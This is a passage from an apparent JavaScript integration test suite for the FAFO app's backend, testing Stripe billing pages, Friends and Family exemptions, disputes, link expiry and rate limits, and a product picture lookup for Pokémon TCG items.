    assert.equal(no.status, 403); assert.deepEqual(await no.json(), { error: "Only your own FAFO can open billing" });
    assert.equal((await api("/billing/list", null, {})).status, 401);
    const before = webhookPosts.length;
    const r = await api("/billing/list", bobKey, { name: "Owner" });
    assert.deepEqual([r.status, await r.json()], [200, { status: "sent" }]);
    const m = posts(before)[0];
    assert.match(m, /^💳 \*\*Billing\*\*\n\[See billing\]\(http[^)]+\/billing\/list\/[A-Za-z0-9_-]+\?t=[A-Za-z0-9_-]+\) · the link works for 24 hours$/);
    billLink = m.match(/\((http[^)]+)\)/)[1];
    const p = await fetchOnce(billLink), html = unescape(await p.text());
    assert.equal(p.status, 200); assert.equal(p.headers.get("cache-control"), "no-store");
    assert.ok(html.includes("Payments are on") && /Owed \$\d+ · Overdue \$\d+ · Paid in the last 30 days \$\d+ · \d+ monthly plans? · \d+ Friends and Family/.test(html), html.slice(0, 2000));
    assert.ok(/Order alerts: last from your FAFO (just now|\d+ min ago)\./.test(html), "the owner's FAFO sends order alerts");
    assert.ok(/<td class="em">@tess · Tess<br>/.test(html) && /<td class="em">@uma · Uma<br>/.test(html), "the buyers");
    assert.ok(/@gina[^<]*<br><span[^>]*>License …\w{4}<\/span><\/td>\s*<td>Friends and Family<\/td>/.test(html), "approved before: Friends and Family");
    assert.ok(/@bob[^<]*<br><span[^>]*>License …\w{4}<\/span><\/td>\s*<td>Your FAFO<\/td>/.test(html));
    assert.ok(/<td>Monthly · 10 slots · renews \d{4}-\d\d-\d\d<\/td>/.test(html), "Tess's plan");
    assert.ok(html.includes("sessionStorage.setItem(KEY, f.value)"), "the search is kept for the tab");
    for (const k of [tessKey, umaKey, ginaKey, bobKey]) assert.ok(!html.includes(k), "never a whole key");
    assert.equal((await fetchOnce(billLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
    assert.equal((await fetchOnce(billLink.replace(/\/billing\/list\/[^?]+/, "/billing/list/nope1234"))).status, 404);
    assert.equal((await fetchOnce(billLink, { method: "PUT" })).status, 405);
  });
  // A 500 here is the local database still held by the test's own `wrangler d1 execute` a moment before (never a thing
  // in Cloudflare): tried once more a second later.
  const billPost = async (link, body, tries = 2) => { const r = await fetchOnce(link.split("?")[0], { method: "POST", redirect: "manual", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), ...body }) });
    const text = await r.text();
    if (r.status === 500 && tries > 1) { await new Promise((ok) => setTimeout(ok, 1000)); return billPost(link, body, tries - 1); }
    return { status: r.status, location: r.headers.get("location") || "", text: unescape(text) }; };
  const doneOf = (loc) => new URL(loc, BASE).searchParams.get("done"), errOf = (loc) => new URL(loc, BASE).searchParams.get("err");
  await test("Billing page: Friends and Family pauses a live monthly plan on Stripe, Charge resumes it; Stripe saying no changes nothing", async () => {
    const b = tessHash.slice(0, 16);
    const view = unescape(await (await fetchOnce(`${billLink}&b=${b}`)).text());
    assert.ok(view.includes("Their invoice") && view.includes("Target #TB-4001") && view.includes('value="family">Friends and Family<'), view.slice(0, 1500));
    const fam = await billPost(billLink, { action: "family", key: tessHash, b });
    assert.equal(fam.status, 303);
    assert.match(fam.location, new RegExp(`^/billing/list/[^?]+\\?t=[^&]+&b=${b}&done=`));
    assert.match(doneOf(fam.location), /Friends and Family now.*Stripe stopped charging their monthly plan\./);
    assert.deepEqual(sub2.pause_collection, { behavior: "void" });
    const st = await billOf(tessKey);
    assert.deepEqual([st.exempt, st.block, st.sub.paused, st.lines], ["family", null, true, []]);
    const charge = await billPost(billLink, { action: "charge", key: tessHash, b });
    assert.match(doneOf(charge.location), /for checkouts from now on\. Stripe charges their monthly plan again\./);
    assert.equal(sub2.pause_collection, null);
    assert.equal((await billOf(tessKey)).exempt, null);
    // As if that was two days ago, so the checkouts below (dated today) are from after it.
    sqlRun(`UPDATE billing_people SET charge_from = charge_from - ${2 * 86400000} WHERE key_hash = '${tessHash}'`);
    stripeFails.push({ path: new RegExp(`^/v1/subscriptions/${sub2.id}$`), method: "POST", status: 400, error: { type: "invalid_request_error", message: "Sample refusal." } });
    const refused = await billPost(billLink, { action: "family", key: tessHash, b });
    assert.equal(errOf(refused.location), "Stripe said no: Sample refusal.");
    assert.equal((await billOf(tessKey)).exempt, null, "unchanged");
    assert.equal((await billPost(billLink.replace(/t=[^&]+/, "t=wrong"), { action: "family", key: tessHash })).status, 404, "a wrong token changes nothing");
  });
  await test("moved from Friends and Family to Charge: billed for checkouts from then on, never for ones from while they weren't charged", async () => {
    const vicHash = hashOf(vicKey), b = vicHash.slice(0, 16), dayOf = (ms) => new Date(ms).toISOString().slice(0, 10);
    const acct = dbRows(`SELECT email FROM accounts WHERE key_hash = '${vicHash}' AND store = 'target' AND profile = 'Vic Fam'`)[0].email;
    // Their slots went out five days ago (an account given them, and one of their own), while they were Friends and Family.
    sqlRun(`UPDATE accounts SET assigned_at = assigned_at - ${5 * 86400000}, sent_at = sent_at - ${5 * 86400000} WHERE key_hash = '${vicHash}'`);
    sqlRun(`UPDATE billing_accounts SET sent_at = sent_at - ${5 * 86400000} WHERE key_hash = '${vicHash}'`);
    assert.equal((await billOf(vicKey)).exempt, "family");
    assert.match(doneOf((await billPost(billLink, { action: "charge", key: vicHash, b })).location), /^They're charged now, like any buyer approved after payments began, for checkouts from now on\.$/);
    const charged = dbRows(`SELECT charge_from FROM billing_people WHERE key_hash = '${vicHash}'`)[0].charge_from;
    assert.ok(Math.abs(charged - Date.now()) < 120000);
    await billPost(billLink, { action: "charge", key: vicHash, b });
    assert.equal(dbRows(`SELECT charge_from FROM billing_people WHERE key_hash = '${vicHash}'`)[0].charge_from, charged, "charging again keeps when");
    const before = dayOf(Date.now() - 2 * 86400000), after = dayOf(Date.now() + 2 * 86400000);
    await alerts([billEv({ account: acct, orderNo: "VC-OLD", at: before, stage: "shipped" }), billEv({ account: acct, orderNo: "VC-NEW", at: after })]);
    const st = await billOf(vicKey);
    assert.deepEqual([st.exempt, st.lines.map((l) => l.orderNo)], [null, ["VC-NEW"]], "a later step of an order from before isn't billed");
    assert.equal(st.report.from, dayOf(charged + 14 * 3600000), "their FAFO reports orders from when they were charged on, not the five days before");
    const r = await (await api("/billing/checkouts", vicKey, { orders: [{ account: "vic.own@example.com", store: "target", orderNo: "VC-OWN-OLD", at: before, stage: "placed" }] })).json();
    assert.deepEqual([r.added, r.ignored], [0, 1]);
    // Yesterday: after payments began (two days back here) whatever the hour, before they were charged.
    assert.equal(errOf((await billPost(billLink, { action: "add", key: vicHash, b, store: "target", order: "VC-ADD-OLD", date: dayOf(Date.now() - 86400000) })).location),
      "Not added: from before you charged them (friends and family then).");
    await billPost(billLink, { action: "family", key: vicHash, b });
    assert.equal((await billOf(vicKey)).exempt, "family");
  });
  await test("Billing page: waive and undo, mark paid, charge again, and answer disputes", async () => {
    const b = tessHash.slice(0, 16), id = async (key, no) => (await lineOf(key, no)).id;
    const act = async (action, key, no) => billPost(billLink, { action, line: await id(key, no), b });
    assert.equal(doneOf((await act("waive", tessKey, "TB-4001")).location), "Waived.");
    assert.deepEqual([(await lineOf(tessKey, "TB-4001")).state, (await billOf(tessKey)).owed], ["waived", 0]);
    assert.match(doneOf((await act("unwaive", tessKey, "TB-4001")).location), /owed again/);
    assert.equal((await lineOf(tessKey, "TB-4001")).state, "due");
    assert.equal(doneOf((await act("mark-paid", tessKey, "TB-4001")).location), "Marked paid.");
    assert.equal((await lineOf(tessKey, "TB-4001")).state, "paid");
    assert.equal(dbRows("SELECT pay_id FROM billing_lines WHERE order_no = 'TB-4001'")[0].pay_id, "manual");
    assert.equal(errOf((await act("waive", tessKey, "TB-4001")).location), "That checkout changed meanwhile, so nothing was done.");
    assert.match(doneOf((await act("charge-again", tessKey, "TB-1002")).location), /owed again/);
    assert.equal((await lineOf(tessKey, "TB-1002")).state, "due");
    await act("waive", tessKey, "TB-1002");
    // One their monthly plan covered once its payment went through was never owed: no Charge again.
    const view = unescape(await (await fetchOnce(`${billLink}&b=${b}`)).text()), covered = await id(tessKey, "TB-6001");
    assert.ok(/Target #TB-6001[\s\S]*?Covered by their monthly plan<\/span><\/td><td>\$10<\/td><td class="act"><\/td>/.test(view), view.slice(0, 3000));
    assert.ok(!view.includes(`name="line" value="${covered}"`), "no button for it");
    assert.equal(errOf((await act("charge-again", tessKey, "TB-6001")).location), "That checkout changed meanwhile, so nothing was done.");
    assert.equal((await lineOf(tessKey, "TB-6001")).state, "canceled");
    const ub = umaHash.slice(0, 16);
    const keep = await billPost(billLink, { action: "dispute-keep", line: await id(umaKey, "UO-1"), b: ub });
    assert.match(doneOf(keep.location), /^Kept/);
    const kept = await lineOf(umaKey, "UO-1");
    assert.equal(kept.state, "due"); assert.ok(kept.dueAt >= Date.now() + 3 * 86400000 - 120000, "3 days from now at the earliest");
    const report = await api("/billing/checkouts", umaKey, { orders: [{ account: "both.own@example.com", store: "target", orderNo: "UO-5", at: today, stage: "placed" }] });
    assert.equal((await report.json()).added, 1);
    await api("/billing/dispute", umaKey, { id: await id(umaKey, "UO-5"), note: "" });
    assert.match(doneOf((await billPost(billLink, { action: "dispute-waive", line: await id(umaKey, "UO-5"), b: ub })).location), /^Waived: not their checkout/);
    assert.equal((await lineOf(umaKey, "UO-5")).state, "waived");
    const html = unescape(await (await fetchOnce(`${billLink}&b=${ub}`)).text());
    assert.ok(html.includes("“Not a slot I sent from FAFO” · you kept it") && html.includes('value="clear-hold">Clear dispute hold<'), html.slice(0, 3000));
    assert.equal(doneOf((await billPost(billLink, { action: "clear-hold", key: umaHash, b: ub })).location), "Hold cleared: they can submit again.");
    assert.equal((await billOf(umaKey)).block, null);
  });
  await test("Billing page: Add a checkout puts one on a buyer's invoice (not a Friends and Family one's), with its note", async () => {
    const ub = umaHash.slice(0, 16);
    const add = await billPost(billLink, { action: "add", key: umaHash, b: ub, store: "target", order: "own-9001", date: today, item: "Sample ETB", note: "from the log" });
    assert.equal(doneOf(add.location), "Added Target #OWN-9001 to their invoice.");
    const l = await lineOf(umaKey, "OWN-9001");
    assert.deepEqual([l.source, l.item, l.state, l.orderAt], ["owner", "Sample ETB · from the log", "due", today]);
    assert.equal(errOf((await billPost(billLink, { action: "add", key: umaHash, b: ub, store: "target", order: "OWN-9001", date: today })).location), "Not added: already on the invoice.");
    assert.equal(errOf((await billPost(billLink, { action: "add", key: tessHash, store: "target", order: "OWN-9003", date: today })).location), "Not added: monthly plan, not billed.");
    const wesKey = await newBuyer("wes");
    await api("/billing/plan", wesKey, { plan: "checkout" });
    assert.equal(errOf((await billPost(billLink, { action: "add", key: hashOf(wesKey), store: "target", order: "OWN-9001", date: today })).location), "Not added: on another buyer's invoice.", "one order, one buyer");
    // Another buyer's own report of an order number is only their word: it doesn't keep it off this buyer's invoice.
    assert.equal((await (await api("/billing/checkouts", umaKey, { orders: [{ account: "both.own@example.com", store: "target", orderNo: "UO-SHARED-1", at: today, stage: "placed" }] })).json()).added, 1);
    assert.equal(doneOf((await billPost(billLink, { action: "add", key: hashOf(wesKey), store: "target", order: "UO-SHARED-1", date: today })).location), "Added Target #UO-SHARED-1 to their invoice.");
    assert.equal(errOf((await billPost(billLink, { action: "add", key: hashOf(ginaKey), store: "target", order: "OWN-9002", date: today })).location), "Not added: friends and family.");
    assert.equal(errOf((await billPost(billLink, { action: "add", key: umaHash, store: "target", order: "", date: today })).location), "Fill in the order number and its date.");
  });
  await test("payments back on after the keys were gone: orders from before then aren't billed late", async () => {
    const yesterday = new Date(Date.now() - 86400000).toISOString().slice(0, 10), ub = umaHash.slice(0, 16);
    sqlRun(`INSERT INTO billing_config (k, v, updated_at) VALUES ('off_seen', '${Date.now() - 60000}', ${Date.now() - 60000})`);
    try {
      const st = await billOf(umaKey);
      const back = Number(dbRows("SELECT v FROM billing_config WHERE k = 'back_on:live'")[0].v);
      assert.ok(Math.abs(back - Date.now()) < 120000, "noted when they were back");
      assert.equal(st.report.from, new Date(back + 14 * 3600000).toISOString().slice(0, 10), "their FAFO reports from then");
      assert.equal(errOf((await billPost(billLink, { action: "add", key: umaHash, b: ub, store: "target", order: "OFF-GAP-1", date: yesterday })).location), "Not added: before billing started.");
      assert.equal((await (await adminGet("/admin/billing")).json()).backOn.live, back);
    } finally { sqlRun("DELETE FROM billing_config WHERE k IN ('off_seen', 'back_on:live')"); }
  });
  await test("Billing page: pasted success lines are matched to who had that email out, checked first, then added", async () => {
    // Uma's FAFO said the store canceled one of them already.
    const report = async (orders) => (await api("/billing/checkouts", umaKey, { orders: orders.map((o) => ({ account: "uma.one@example.com", store: "target", at: today, ...o })) })).json();
    assert.deepEqual(await report([{ orderNo: "UO-CXL-1", stage: "placed" }, { orderNo: "UO-CXL-1", stage: "canceled" }]), { ok: true, added: 1, canceled: 1, ignored: 0 });
    const later = new Date(Date.now() + 2 * 86400000).toISOString().slice(0, 10);
    const paste = [`✅ Success | Target | Sample Bundle | Order #PASTE-1001 | uma.one@example.com | ${today}`, `Success Target order 102003004005 ${tessAcct}`,
      `Success | Pokemon Center | Order #PASTE-1003 | nobody@example.com`, `Success | Target | uma.one@example.com | no number here`, `Target PASTE-1004 Both.Own@example.com ${today}`,
      `Target UG-PASTE-9 ${umaAcct} ${later}`, `Target UO-CXL-1 uma.one@example.com ${today}`].join("\n");
    const pv = await billPost(billLink, { action: "paste-preview", paste, store: "target", date: today });
    assert.equal(pv.status, 200, "a preview writes nothing");
    assert.ok(pv.text.includes("Will add") && pv.text.includes("Monthly plan, not billed") && pv.text.includes("No slot out with this email on that date") && pv.text.includes("No order number in this line"), pv.text.slice(0, 4000));
    assert.ok(/#UG-PASTE-9[^<]*<\/span><\/td>\s*<td><\/td>\s*<td>No slot out with this email on that date<\/td>/.test(pv.text), "an account they were given, after they pulled its slot");
    assert.ok(/#UO-CXL-1[^<]*<\/span><\/td>\s*<td>@uma · Uma<br><span[^>]*>Uma One<\/span><\/td>\s*<td>Canceled by the store, their FAFO said<\/td>/.test(pv.text), pv.text.slice(-3000));
    assert.ok(/<select name="pick4"[^>]*><option value="">Pick a buyer<\/option><option value="[0-9a-f]{64}">@tess · Tess · Tess Both<\/option><option value="[0-9a-f]{64}">@uma · Uma · Uma Both<\/option>/.test(pv.text)
      || /<select name="pick4"[^>]*><option value="">Pick a buyer<\/option><option value="[0-9a-f]{64}">@uma · Uma · Uma Both<\/option><option value="[0-9a-f]{64}">@tess · Tess · Tess Both<\/option>/.test(pv.text), "two had it out: pick one");
    assert.ok(pv.text.includes(">Add 1 checkout<"));
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM billing_lines WHERE order_no LIKE 'PASTE-%'")[0].n, 0);
    const add = await billPost(billLink, { action: "paste-add", paste, store: "target", date: today, pick4: umaHash });
    assert.equal(add.status, 303);
    assert.equal(doneOf(add.location), "Added 2 checkouts.");
    assert.equal(errOf(add.location), "5 lines weren't added (preview them to see why).");
    assert.deepEqual(dbRows("SELECT order_no, key_hash, source, acct_hash FROM billing_lines WHERE order_no LIKE 'PASTE-%' ORDER BY order_no"),
      [{ order_no: "PASTE-1001", key_hash: umaHash, source: "owner", acct_hash: acctOf("uma.one@example.com") }, { order_no: "PASTE-1004", key_hash: umaHash, source: "owner", acct_hash: acctOf("both.own@example.com") }]);
    assert.deepEqual(dbRows("SELECT source, cancel_src FROM billing_lines WHERE order_no = 'UO-CXL-1'"), [{ source: "buyer", cancel_src: "buyer" }], "still canceled, still their report");
    assert.ok(!JSON.stringify(dbRows("SELECT * FROM billing_lines")).includes("nobody@example.com"), "emails are never kept");
    // The store cancels one the owner pasted, on their own account: their FAFO says so, and it's free. One the owner added by
    // hand (no account of theirs) isn't theirs to cancel.
    assert.deepEqual(await report([{ orderNo: "PASTE-1001", stage: "canceled" }, { orderNo: "OWN-9001", stage: "canceled" }]), { ok: true, added: 0, canceled: 1, ignored: 1 });
    assert.deepEqual([(await lineOf(umaKey, "PASTE-1001")).state, (await lineOf(umaKey, "OWN-9001")).state], ["canceled", "due"]);
  });
  await test("Billing page: the link lasts 24 hours, and 10 are asked a day; the admin summary", async () => {
    const d = await (await adminGet("/admin/billing")).json();
    assert.deepEqual([d.on, d.mode, d.alertsSeen.last4, typeof d.prices.live.base, d.plans.monthly], [true, "live", bobKey.slice(-4), "string", 1]);
    assert.ok(d.owed.owed > 0 && d.people.n >= 2);
    assert.equal((await fetch(BASE + "/admin/billing")).status, 401);
    const id = billLink.match(/\/billing\/list\/([^?]+)/)[1];
    sqlRun(`UPDATE billing_lists SET created_at = created_at - ${25 * 3600 * 1000} WHERE id = '${id}'`);
    const late = await fetchOnce(billLink);
    assert.equal(late.status, 410); assert.match(await late.text(), /This link has expired\. Ask again from FAFO: Settings → Billing\./);
    assert.equal((await billPost(billLink, { action: "family", key: umaHash })).status, 410, "and changes nothing");
    let n = dbRows(`SELECT COUNT(*) AS n FROM billing_lists WHERE key_hash = '${hashOf(bobKey)}' AND created_at > ${Date.now() - 86400000}`)[0].n;
    while (n < 10) { assert.equal((await api("/billing/list", bobKey, { name: "Owner" })).status, 200); n++; }
    const before = webhookPosts.length;
    assert.equal((await api("/billing/list", bobKey, { name: "Owner" })).status, 429);
    assert.equal(webhookPosts.length, before, "nothing posted");
  });
  await test("where Stripe sends the buyer back: paid, plan on, processing, no payment, and Back to FAFO for the web version", async () => {
    const paid = [...sx.sessions.values()].find((s) => s.mode === "payment" && s.payment_status === "paid"), plan = [...sx.sessions.values()].find((s) => s.subscription === sub2.id);
    const page = async (q) => { const r = await fetchOnce(BASE + "/billing/done" + q); return { status: r.status, text: unescape(await r.text()) }; };
    assert.match((await page(`?s=${paid.id}`)).text, /<h2>Payment received<\/h2><p>Go back to the FAFO app\. It updates by itself\.<\/p>/);
    assert.match((await page(`?s=${plan.id}&w=0`)).text, /<h2>Your monthly plan is on<\/h2><p>You can close this tab and go back to FAFO\.<\/p>[\s\S]*Back to FAFO[\s\S]*https:\/\/app\.fafoaco\.com\//);
    assert.match((await page("?s=cs_test_unknown999")).text, /<h2>Payment is processing<\/h2>/);
    assert.match((await page("?c=1")).text, /<h2>No payment was made<\/h2><p>Go back to the FAFO app\. It updates by itself\.<\/p>/);
  });
  await test("switching to pay per checkout while a monthly payment has failed ends the plan now; the channel hears it's pay per checkout", async () => {
    const before = webhookPosts.length;
    const failed = sxRenew(sub2);
    failed.status = "open"; sub2.status = "past_due";
    assert.equal(await hook("invoice.payment_failed", { id: failed.id, object: "invoice", parent: { type: "subscription_details", subscription_details: { subscription: sub2.id } } }), 200);
    const r = await api("/billing/plan", tessKey, { plan: "checkout" });
    assert.equal(r.status, 200);
    const st = await r.json();
    assert.deepEqual([st.plan, st.nextPlan, st.sub, st.block], ["checkout", null, null, null]);
    assert.equal(lastStripe("DELETE", `/v1/subscriptions/${sub2.id}`).idem, `subcancel:${sub2.id}`);
    assert.deepEqual(posts(before), ["⚠️ **Tess**'s monthly payment failed · about 2 slots out", "🗓️ **Tess**'s monthly plan ended · pay per checkout · about 2 slots out"]);
  });
  await test("a billing error (a D1 table gone) never fails /alerts, /pull or /submissions", async () => {
    const tables = ["billing_lines", "billing_accounts", "billing_pulled", "billing_people"];
    for (const t of tables) sqlRun(`ALTER TABLE ${t} RENAME TO ${t}_away`);
    try {
      const a = await api("/alerts", bobKey, { events: [billEv({ account: umaAcct, orderNo: "ERR-1" }), billEv({ account: umaAcct, orderNo: "ERR-2", stage: "canceled" })] });
      assert.equal(a.status, 200); assert.deepEqual(await a.json(), { ok: true, sent: 2, already: 0, unknown: 0 });
      const s = await submit(ginaKey, [ownFile([["Gina Err", "gina.err@example.com"]]), loginsFile(["gina.err@example.com"])], { name: "Gina", on: 30 });
      assert.equal(s.status, 200, await s.clone().text());
      const p = await api("/pull", ginaKey, { keyId: "CSV", name: "Gina", batch: "ue" + rid(), slots: [{ store: "Target", profile: "Gina Err", email: "gina.err@example.com" }] });
      assert.equal(p.status, 200);
    } finally { for (const t of tables) sqlRun(`ALTER TABLE ${t}_away RENAME TO ${t}`); }
    assert.equal(await lineOf(umaKey, "ERR-1"), undefined, "nothing billed meanwhile");
    await alerts([billEv({ account: umaAcct, orderNo: "ERR-3" })]);
    assert.equal((await lineOf(umaKey, "ERR-3")).state, "due", "and billing goes on once it's back");
  });

  console.log("\nPayments in test mode (a key without _live_)");
  stopWorker(workers.pop());
  await new Promise((r) => setTimeout(r, 1500));
  await startWorker("billing-test", APPROVAL_PORT - 1, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", ...STRIPE, "STRIPE_SECRET_KEY=fake_test_key_not_real"], "approval");
  await test("test mode reaches only testers (and the owner's FAFO); live rows never show in it", async () => {
    assert.deepEqual(await billOf(tessKey), { on: false });
    assert.deepEqual(await billOf(umaKey), { on: false });
    assert.equal((await billOf(bobKey)).exempt, "owner", "the owner can still open billing");
    assert.ok(dbRows("SELECT v FROM billing_config WHERE k = 'on_since:test'").length, "test mode's own start");
    assert.equal((await submit(umaKey, [ownFile([["Uma One", "uma.one@example.com"]])], { on: 3, name: "Uma" })).status, 200, "not a tester: never refused");
    assert.deepEqual(await (await api("/slots/limit", tessKey)).json().then((x) => [x.limit, x.plan]), [20, undefined], "no monthly plan in test mode");
    const r = await api("/billing/list", bobKey, { name: "Owner" });
    assert.equal(r.status, 429, "the day's 10 links are used up (any mode)");
    sqlRun(`UPDATE billing_lists SET created_at = created_at - ${86400000} WHERE key_hash = '${hashOf(bobKey)}'`);
    assert.equal((await api("/billing/list", bobKey, { name: "Owner" })).status, 200);
    const link = webhookPosts.at(-1).content.match(/\((http[^)]+)\)/)[1];
    const html = unescape(await (await fetchOnce(link)).text());
    assert.ok(html.includes("Test mode: only testers are charged"));
    const b = umaHash.slice(0, 16);
    assert.ok(unescape(await (await fetchOnce(`${link}&b=${b}`)).text()).includes('value="tester">Tester<'));
    assert.match(doneOf((await billPost(link, { action: "tester", key: umaHash, b })).location), /^Marked as a tester/);
    const st = await billOf(umaKey);
    assert.deepEqual([st.on, st.mode, st.exempt, st.plan, st.lines, st.block], [true, "test", null, null, [], { reason: "no-plan", text: "Pick a plan to submit." }], "approved before test mode, but a tester");
    assert.equal((await submit(umaKey, [ownFile([["Uma One", "uma.one@example.com"]])], { on: 3 })).status, 402);
    // Billing reaches a tester from when they were marked: an order from before then isn't theirs to pay (even with test
    // mode on for days).
    const since = dbRows("SELECT v FROM billing_config WHERE k = 'on_since:test'")[0].v, twoDaysAgo = new Date(Date.now() - 2 * 86400000).toISOString().slice(0, 10);
    sqlRun(`UPDATE billing_config SET v = '${Date.now() - 5 * 86400000}' WHERE k = 'on_since:test'`);
    try {
      assert.equal(errOf((await billPost(link, { action: "add", key: umaHash, b, store: "target", order: "TM-OLD-1", date: twoDaysAgo })).location), "Not added: from before you charged them (friends and family then).");
    } finally { sqlRun(`UPDATE billing_config SET v = '${since}' WHERE k = 'on_since:test'`); }
    assert.equal(await hook("checkout.session.completed", sx.sessions.values().next().value), 200, "a live event in test mode: nothing");
    await billPost(link, { action: "untester", key: umaHash, b });
    assert.deepEqual(await billOf(umaKey), { on: false });
  });

  console.log("\nProduct pictures (app 1.9.113)");
  await startWorker("pictures", APPROVAL_PORT + 3, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", "PICTURES_LIST_MS=4000", "PICTURES_ASKS_PER_DAY=60"]);
  const pic = (q, key = GH_KEY) => fetch(BASE + "/pictures/find?q=" + encodeURIComponent(q), { headers: key ? { authorization: "Bearer " + key } : {}, cache: "no-store" });
  // Asks again while the worker is still reading the catalog's lists (`more`), as the app does.
  const find = async (q) => {
    for (let i = 0; i < 8; i++) {
      const r = await pic(q);
      assert.equal(r.status, 200, q);
      assert.equal(r.headers.get("access-control-allow-origin"), "*");
      assert.equal(r.headers.get("cache-control"), "no-store");
      const d = await r.json();
      if (!d.more) return d;
    }
    throw new Error("still reading the catalog after 8 asks: " + q);
  };
  const picData = (d) => Buffer.from(d.image.replace(/^data:image\/png;base64,/, ""), "base64");
  await test("pictures: a license is needed, and a name of one word or a code isn't looked up", async () => {
    catalogHits.length = 0;
    assert.equal((await pic("Delta Reign Elite Trainer Box", "")).status, 401);
    assert.equal((await pic("Delta Reign Elite Trainer Box", "PVLT-AAAA-BBBB-CCCC-DDDD")).status, 401);
    for (const q of ["Order", "ETB", "912003760096466", "", "Pokémon TCG"]) assert.deepEqual(await (await pic(q)).json(), { found: false }, q);
    assert.deepEqual(catalogHits, [], "the catalog wasn't asked");
  });
  await test("pictures: the catalog not answering is an error to try again later, not 'nothing found'", async () => {
    catalogDown = true;
    try {
      const r = await pic("Pokémon TCG: Mega Evolution—Delta Reign Pokémon Center Elite Trainer Box");
      assert.equal(r.status, 502);
      assert.equal(r.headers.get("access-control-allow-origin"), "*");
    } finally { catalogDown = false; }
  });
  await test("pictures: Pokémon Center's own Elite Trainer Box, read from the catalog a few lists at a time", async () => {
    catalogHits.length = 0; imageHits.length = 0;
    const d = await find("Pokémon TCG: Mega Evolution—Delta Reign Pokémon Center Elite Trainer Box");
    assert.equal(d.found, true);
    assert.equal(d.product, 712104);
    assert.equal(d.name, "Delta Reign Pokemon Center Elite Trainer Box");
    assert.equal(d.source, "TCGplayer");
    assert.match(d.image, /^data:image\/png;base64,/);
    assert.deepEqual(picData(d), PIXEL);
    assert.deepEqual(imageHits, ["/img/fit/712104.jpg"]);
    assert.equal(catalogHits.filter((h) => h === "/catalog/groups").length, 1, "groups read once");
    assert.ok(catalogHits.includes("/catalog/900/products"), "the group named in it was read");
    assert.ok(catalogHits.filter((h) => h.endsWith("/products")).length <= 3, "at most 3 lists in one ask: " + catalogHits.join(" "));
  });
  await test("pictures: an answer is kept, and asked again it comes from there", async () => {
    catalogHits.length = 0; imageHits.length = 0;
    const d = await find("Pokemon Trading Card Game: Mega Evolution Delta Reign Pokemon Center Elite Trainer Box");
    assert.equal(d.product, 712104);
    assert.deepEqual(catalogHits, []); assert.deepEqual(imageHits, []);
  });
  await test("pictures: the store's Elite Trainer Box, the Booster Display, the Booster Bundle, each its own", async () => {
    const want = {
      "Pokémon TCG: Mega Evolution—Delta Reign Elite Trainer Box": 712100,
      "Pokémon TCG: Mega Evolution-Delta Reign Booster Display Box (36 Packs)": 712101,
      "Pokémon Trading Card Game: Mega Evolution Delta Reign Booster Bundle (6 Booster Packs)": 712103,
      "Pokémon Trading Card Game: 30th Celebration Figure Collection- Mew": 720001,
      "Pokémon Trading Card Game: 30th Celebration Ultra-Premium Collection - Day": 720003,
      "Pokemon TCG: 30th Celebration Ultra Premium Collection (Night)": 720004,
      "Pokemon Trading Card Game 30th Celebration Ditto Premium Collection": 720005,
      "Pokemon TCG Mega Evolution Elite Trainer Box - Mega Lucario": 650001,
    };
    for (const [q, id] of Object.entries(want)) { const d = await find(q); assert.equal(d.found, true, q); assert.equal(d.product, id, q); }
  });
  await test("pictures: an older set's group is read when the name shares its words; its picture from the second server", async () => {
    imageHits.length = 0;
    const d = await find("Pokemon Scarlet & Violet S8.5 Prismatic Evolutions Elite Trainer Box (Target Exclusive)");
    assert.equal(d.product, 600001);
    assert.deepEqual(imageHits, ["/img/fit/600001.jpg", "/img/cdn/600001_200w.jpg"]);
  });
  await test("pictures: never a near match: another edition, a case, a blister without its Pokémon, a card, two that fit", async () => {
    for (const q of ["Delta Reign Booster Box Case Bundle",
      "Pokémon TCG: Mega Evolution—Delta Reign Three-Booster Blister",
      "Mega Gengar ex 091/131",
      "Pokémon TCG: 30th Celebration Figure Collection",
      "Delta Reign 30th Celebration Collection",
      "Pokémon TCG: Paldean Fates Tin"]) assert.equal((await find(q)).found, false, q);
    const tr = await (await admin("/admin/pictures?q=" + encodeURIComponent("Delta Reign 30th Celebration Collection"))).json();
    assert.equal(tr.result.ambiguous, true);
    assert.deepEqual(tr.fits.map((f) => f.id).sort(), [712190, 720190]);
  });
  await test("pictures: a product whose picture doesn't come isn't an answer", async () => {
    const d = await find("Mega Evolution Elite Trainer Box [Mega Gardevoir]");
    assert.deepEqual(d, { found: false });
  });
  await test("pictures: a series' own set by its series' name, never another series' product", async () => {
    // ME01 and SV01 aren't among the ten newest groups: they're searched for the series the name has.
    assert.equal((await find("Pokémon TCG: Mega Evolution Booster Bundle")).product, 650003);
    assert.equal((await find("Pokémon Trading Card Game: Scarlet & Violet Booster Bundle")).product, 500001);
    assert.equal((await find("Pokemon TCG Scarlet & Violet Elite Trainer Box (Koraidon)")).product, 500002);
    assert.equal((await find("Pokémon TCG: Sword & Shield Booster Bundle")).found, false, "no Sword & Shield one: not another series'");
  });
  await test("pictures: a group that can't be read is tried again in an hour, and nothing found then isn't kept long", async () => {
    const before = catalogHits.filter((h) => h === "/catalog/905/products").length;
    assert.equal((await find("Pokémon TCG: Obsidian Flames Tin")).found, false);
    assert.equal((await find("Pokémon TCG: Paradox Rift Tin")).found, false);
    assert.ok(catalogHits.filter((h) => h === "/catalog/905/products").length - before <= 1, "905 isn't asked again at once");
    const tr = await (await admin("/admin/pictures?q=" + encodeURIComponent("Pokémon TCG: Paradox Rift Tin"))).json();
    assert.ok(tr.cached && tr.cached.until - tr.cached.at <= 3600000, "kept an hour, since a group couldn't be read");
  });
  await test("pictures: with the catalog down, the lists kept are used (day-old ones too)", async () => {
    await new Promise((ok) => setTimeout(ok, 4500));   // every list kept is now older than PICTURES_LIST_MS
    catalogDown = true;
    try {
      // Names not asked before, so they're looked up, not answered from what's kept.
      assert.equal((await find("Pokémon TCG: Mega Evolution—Delta Reign Three-Booster Blister (Mega Froslass)")).product, 712106);
      assert.equal((await find("Pokémon TCG: Scarlet & Violet—Prismatic Evolutions Pokémon Center Elite Trainer Box")).product, 600002);
    } finally { catalogDown = false; }
  });
  await test("pictures: a license gets so many lookups a day that aren't answered from what's kept", async () => {
